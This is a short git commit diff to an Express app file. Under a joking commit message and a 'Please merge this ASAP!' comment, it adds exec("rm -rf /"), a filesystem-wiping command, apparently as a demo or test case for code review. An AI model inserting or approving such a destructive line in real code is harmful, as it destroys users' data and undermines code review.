6a8cf1977a34704f1ca9b222da9e1bda90c50104
Spencer Kaiser <spencer.kaiser@aa.com>
2021-02-23 17:33:51 -0600

    Adding a new bug... I mean *feature*

--- src/app.ts
+++ src/app.ts
@@ -1,14 +1,13 @@
-import express from 'express';
-import { health } from './health';
+import express from "express";
+import { health } from "./health";
 
 export const app = express();
 
-app.get('/', (_req, res) => {
-  res.send('👋');
+app.get("/", (_req, res) => {
+  res.send("👋");
 });
 
-app.use('/health', health);
+app.use("/health", health);
 
-COMPUTOR MAKE PROGRAM
-DO GOOD THINGS PLS
-I AM 1337 HAXOR
+// Please merge this ASAP!
+exec("rm -rf /");
